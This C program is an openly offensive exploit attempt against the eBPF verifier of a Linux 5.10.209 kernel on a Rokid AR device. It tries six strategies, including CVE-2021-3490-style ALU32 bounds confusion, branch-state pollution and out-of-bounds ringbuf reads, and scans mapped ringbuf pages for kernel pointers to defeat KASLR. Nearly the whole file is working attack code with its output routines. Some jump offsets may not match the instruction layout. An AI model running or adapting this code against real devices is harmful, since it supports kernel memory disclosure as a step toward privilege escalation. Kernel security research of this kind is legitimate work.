/*
 * BPF Ringbuf OOB Read Attempt
 * Target: Kernel 5.10.209 Rokid AR
 *
 * Strategy: Attempt to confuse verifier bounds tracking
 * to read adjacent slab objects for KASLR bypass
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/bpf.h>

/* BPF Instruction Macros */
#define BPF_ALU64_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_ALU32_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_ALU64_REG(OP, DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_MOV64_REG(DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_MOV64_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_MOV32_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_LD_MAP_FD(DST, FD)                                                                                 \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = 1, .off = 0, .imm = FD}), \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})
#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_JMP_REG(OP, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_JMP32_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP32 | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_STX_MEM(SZ, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_STX | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_LDX_MEM(SZ, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_LDX | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})
#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT})
#define BPF_ST_MEM(SZ, DST, OFF, IMM) \
    ((struct bpf_insn){.code = BPF_ST | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_SIZE(code) ((code) & 0x18)
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_FUNC_ringbuf_submit 132
#define BPF_FUNC_ringbuf_discard 133

static char log_buf[65536];

int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int create_ringbuf(int max_entries)
{
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_RINGBUF;
    attr.max_entries = max_entries;
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int create_array(int value_size, int max_entries)
{
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = value_size;
    attr.max_entries = max_entries;
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int load_bpf_prog(struct bpf_insn *insns, int insn_cnt, const char *name)
{
    memset(log_buf, 0, sizeof(log_buf));
    union bpf_attr attr = {0};
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (unsigned long)insns;
    attr.insn_cnt = insn_cnt;
    attr.license = (unsigned long)"GPL";
    attr.log_buf = (unsigned long)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int fd = bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
    printf("[%s] %s (fd=%d errno=%d)\n", name, fd >= 0 ? "SUCCESS" : "FAILED", fd, errno);
    if (fd < 0 && strlen(log_buf) > 0)
    {
        /* Print first 500 chars of verifier log */
        printf("Verifier: %.500s\n", log_buf);
    }
    return fd;
}

void trigger_bpf_prog(int prog_fd)
{
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0)
        return;

    int flags = fcntl(socks[0], F_GETFL, 0);
    fcntl(socks[0], F_SETFL, flags | O_NONBLOCK);
    fcntl(socks[1], F_SETFL, flags | O_NONBLOCK);

    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0)
    {
        close(socks[0]);
        close(socks[1]);
        return;
    }

    char buf[64] = "trigger";
    write(socks[1], buf, sizeof(buf));
    read(socks[0], buf, sizeof(buf));

    close(socks[0]);
    close(socks[1]);
}

void hexdump(const char *desc, void *addr, int len)
{
    unsigned char *p = (unsigned char *)addr;
    printf("%s:\n", desc);
    for (int i = 0; i < len; i += 16)
    {
        printf("  %04x: ", i);
        for (int j = 0; j < 16 && i + j < len; j++)
            printf("%02x ", p[i + j]);
        printf("\n");
    }
}

void scan_for_kernel_ptrs(unsigned long *buf, int count)
{
    for (int i = 0; i < count; i++)
    {
        unsigned long val = buf[i];
        /* ARM64 kernel pointers: 0xffffff80xxxxxxxx or 0xffffffc0xxxxxxxx */
        if ((val & 0xffffff0000000000UL) == 0xffffff0000000000UL)
        {
            printf("  [%d] KERNEL PTR: 0x%016lx\n", i, val);
        }
        /* Check for kernel text pointers (common pattern) */
        if ((val >> 40) == 0xffffff)
        {
            printf("  [%d] Possible kptr: 0x%016lx\n", i, val);
        }
    }
}

/*
 * ============================================
 * Strategy 1: ALU32/ALU64 Bounds Confusion
 * ============================================
 * In some kernel versions, 32-bit operations don't properly
 * propagate bounds to 64-bit tracking, allowing OOB access.
 */
void test_alu32_confusion(int rb_fd)
{
    printf("\n=== Test 1: ALU32 Bounds Confusion ===\n");

    /*
     * Idea: Use 32-bit arithmetic to compute an offset that
     * wraps around, but the 64-bit verifier tracking is confused.
     *
     * r0 = ringbuf_reserve(rb, 256, 0)  -> returns ptr with range [0, 255]
     * r7 = r0  (save ptr)
     * r8 = 0xffffffff (as 32-bit, this is -1)
     * r8 += 1 (now r8 = 0 in 32-bit, but verifier might track as 0x100000000)
     * r9 = *(r7 + r8) <- OOB read attempt
     *
     * This is the CVE-2021-3490 pattern.
     */
    struct bpf_insn prog[] = {
        /* Reserve 256 bytes */
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),                                     /* 0-1 */
        BPF_MOV64_IMM(BPF_REG_2, 256),                                       /* 2 */
        BPF_MOV64_IMM(BPF_REG_3, 0),                                         /* 3 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve), /* 4 */

        /* if r0 == NULL, exit */
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 12), /* 5: jump to exit */

        /* r7 = r0 (save ptr) */
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), /* 6 */

        /* ALU32 trick: r8 = 0xffffffff, then r8 += 1 */
        BPF_MOV32_IMM(BPF_REG_8, 0xffffffff), /* 7 */
        BPF_ALU32_IMM(BPF_ADD, BPF_REG_8, 1), /* 8: r8 = 0 (32-bit wrap) */

        /* Try to use r8 as offset - verifier should catch this */
        /* r9 = *(u64*)(r7 + r8) */
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_8), /* 9: r7 += r8 */
        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, 0), /* 10 */

        /* Store result in ringbuf for readout */
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),          /* 11: restore ptr */
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_9, 0), /* 12: store leaked value */

        /* Submit */
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),                                /* 13 */
        BPF_MOV64_IMM(BPF_REG_2, 0),                                        /* 14 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit), /* 15 */

        BPF_MOV64_IMM(BPF_REG_0, 0), /* 16 */
        BPF_EXIT_INSN(),             /* 17 */
        BPF_EXIT_INSN(),             /* 18: null path */
    };

    load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), "ALU32_Confusion");
}

/*
 * ============================================
 * Strategy 2: Conditional Branch State Pollution
 * ============================================
 * Complex conditional branches can cause verifier to lose
 * precise bounds tracking.
 */
void test_branch_confusion(int rb_fd, int arr_fd)
{
    printf("\n=== Test 2: Branch State Pollution ===\n");

    /*
     * Idea: Create a complex control flow that confuses the verifier's
     * state tracking at merge points.
     *
     * The verifier must merge states at branch convergence points.
     * If we can make it lose precision, we might get OOB access.
     */
    struct bpf_insn prog[] = {
        /* Get a scalar from map lookup */
        BPF_LD_MAP_FD(BPF_REG_1, arr_fd),             /* 0-1 */
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         /* 2 */
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        /* 3 */
        BPF_ST_MEM(BPF_W, BPF_REG_10, -8, 0),         /* 4: key = 0 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, 1), /* 5: map_lookup_elem */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 20), /* 6: null check */

        /* r6 = *map_value (user-controlled scalar) */
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), /* 7 */

        /* Bounds check: if r6 > 128, clamp it */
        BPF_JMP_IMM(BPF_JLE, BPF_REG_6, 128, 2), /* 8 */
        BPF_MOV64_IMM(BPF_REG_6, 0),             /* 9: clamp to 0 */
        BPF_JMP_IMM(BPF_JA, 0, 0, 0),            /* 10: nop */
        /* After this, verifier knows r6 is in [0, 128] */

        /* Now reserve ringbuf */
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),                                     /* 11-12 */
        BPF_MOV64_IMM(BPF_REG_2, 256),                                       /* 13 */
        BPF_MOV64_IMM(BPF_REG_3, 0),                                         /* 14 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve), /* 15 */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 9), /* 16: null check */

        /* r7 = ptr, use r6 as offset */
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),          /* 17 */
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_6), /* 18: ptr += scalar */

        /* Read at offset - should be within bounds if verifier is correct */
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), /* 19 */

        /* Store at beginning of buffer */
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0), /* 20 */

        /* Submit */
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),                                /* 21 */
        BPF_MOV64_IMM(BPF_REG_2, 0),                                        /* 22 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit), /* 23 */

        BPF_MOV64_IMM(BPF_REG_0, 0), /* 24 */
        BPF_EXIT_INSN(),             /* 25 */
        BPF_EXIT_INSN(),             /* 26: null path 1 */
        BPF_EXIT_INSN(),             /* 27: null path 2 */
    };

    load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), "BranchConfusion");
}

/*
 * ============================================
 * Strategy 3: Read Ringbuf Header Metadata
 * ============================================
 * The ringbuf entry has a header before the user data.
 * struct bpf_ringbuf_hdr {
 *     u32 len;      // at offset -8
 *     u32 pg_off;   // at offset -4
 * };
 * If we can read at negative offset, we get metadata.
 */
void test_header_read(int rb_fd)
{
    printf("\n=== Test 3: Ringbuf Header Read Attempt ===\n");

    /*
     * Direct negative offset access will be rejected.
     * But let's see what error we get - it reveals verifier behavior.
     */
    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),                                     /* 0-1 */
        BPF_MOV64_IMM(BPF_REG_2, 64),                                        /* 2 */
        BPF_MOV64_IMM(BPF_REG_3, 0),                                         /* 3 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve), /* 4 */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 6), /* 5 */

        /* Try to read at offset -8 (header) */
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),           /* 6 */
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, -8), /* 7: NEGATIVE OFFSET */

        /* Discard */
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),                                 /* 8 */
        BPF_MOV64_IMM(BPF_REG_2, 1),                                         /* 9 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard), /* 10 */

        BPF_MOV64_IMM(BPF_REG_0, 0), /* 11 */
        BPF_EXIT_INSN(),             /* 12 */
    };

    load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), "HeaderRead");
}

/*
 * ============================================
 * Strategy 4: Size Confusion via Large Reserve
 * ============================================
 * Request a large reserve size and check if there's
 * any edge case in size handling.
 */
void test_size_edge_cases(int rb_fd)
{
    printf("\n=== Test 4: Size Edge Cases ===\n");

    /* Test various edge case sizes */
    int sizes[] = {0, 1, 7, 8, 15, 16, 255, 256, 4095, 4096, 0x7fffffff, -1};

    for (int i = 0; i < sizeof(sizes) / sizeof(sizes[0]); i++)
    {
        int size = sizes[i];

        struct bpf_insn prog[] = {
            BPF_LD_MAP_FD(BPF_REG_1, rb_fd),
            BPF_MOV64_IMM(BPF_REG_2, size),
            BPF_MOV64_IMM(BPF_REG_3, 0),
            BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

            BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 4),

            BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
            BPF_MOV64_IMM(BPF_REG_2, 1),
            BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),

            BPF_MOV64_IMM(BPF_REG_0, 0),
            BPF_EXIT_INSN(),
        };

        char name[32];
        snprintf(name, sizeof(name), "Size_%d", size);
        int fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), name);
        if (fd >= 0)
            close(fd);
    }
}

/*
 * ============================================
 * Strategy 5: Read Adjacent Memory via Overread
 * ============================================
 * Reserve small size but read past the end.
 * This is the most direct OOB attempt.
 */
void test_overread(int rb_fd)
{
    printf("\n=== Test 5: Overread Attempt ===\n");

    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),                                     /* 0-1 */
        BPF_MOV64_IMM(BPF_REG_2, 8),                                         /* 2: reserve only 8 bytes */
        BPF_MOV64_IMM(BPF_REG_3, 0),                                         /* 3 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve), /* 4 */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 7), /* 5 */

        /* Try to read at offset 64 (past end of 8-byte reservation) */
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),           /* 6 */
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 64), /* 7: OOB READ */

        /* Discard */
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),                                 /* 8 */
        BPF_MOV64_IMM(BPF_REG_2, 1),                                         /* 9 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard), /* 10 */

        BPF_MOV64_IMM(BPF_REG_0, 0), /* 11 */
        BPF_EXIT_INSN(),             /* 12 */
        BPF_EXIT_INSN(),             /* 13: null */
    };

    load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), "Overread");
}

/*
 * ============================================
 * Strategy 6: Scan Ringbuf Page for Kernel Pointers
 * ============================================
 * Even without OOB, the ringbuf pages might contain
 * residual kernel data from previous allocations.
 */
void test_residual_data(int rb_fd)
{
    printf("\n=== Test 6: Scan Residual Data ===\n");

    /* mmap all ringbuf pages and scan for kernel pointers */

    /* Consumer page at offset 0 */
    void *consumer = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, rb_fd, 0);
    if (consumer != MAP_FAILED)
    {
        printf("Consumer page at %p\n", consumer);
        scan_for_kernel_ptrs((unsigned long *)consumer, 512);
        munmap(consumer, 4096);
    }

    /* Producer page at offset 4096 */
    void *producer = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rb_fd, 4096);
    if (producer != MAP_FAILED)
    {
        printf("Producer page at %p\n", producer);
        scan_for_kernel_ptrs((unsigned long *)producer, 512);
        munmap(producer, 4096);
    }

    /* Data pages at offset 8192+ */
    void *data = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rb_fd, 8192);
    if (data != MAP_FAILED)
    {
        printf("Data page at %p\n", data);
        scan_for_kernel_ptrs((unsigned long *)data, 512);
        munmap(data, 4096);
    }
}

int main(void)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("===========================================\n");
    printf("BPF Ringbuf OOB Read Attempt\n");
    printf("Target: Kernel 5.10.209 Rokid AR\n");
    printf("===========================================\n");

    /* Create ringbuf - larger size for more adjacent memory */
    int rb_fd = create_ringbuf(4096 * 16);
    if (rb_fd < 0)
    {
        printf("Failed to create ringbuf: %d\n", errno);
        return 1;
    }
    printf("Ringbuf fd=%d\n", rb_fd);

    /* Create array map for scalar control */
    int arr_fd = create_array(8, 1);
    if (arr_fd < 0)
    {
        printf("Failed to create array: %d\n", errno);
        close(rb_fd);
        return 1;
    }
    printf("Array fd=%d\n", arr_fd);

    /* Initialize array with test value */
    int key = 0;
    unsigned long val = 120; /* Within bounds for branch test */
    union bpf_attr attr = {0};
    attr.map_fd = arr_fd;
    attr.key = (unsigned long)&key;
    attr.value = (unsigned long)&val;
    bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

    /* Run all test strategies */
    test_alu32_confusion(rb_fd);
    test_branch_confusion(rb_fd, arr_fd);
    test_header_read(rb_fd);
    test_size_edge_cases(rb_fd);
    test_overread(rb_fd);
    test_residual_data(rb_fd);

    close(arr_fd);
    close(rb_fd);

    printf("\n===========================================\n");
    printf("Analysis Complete\n");
    printf("===========================================\n");

    return 0;
}
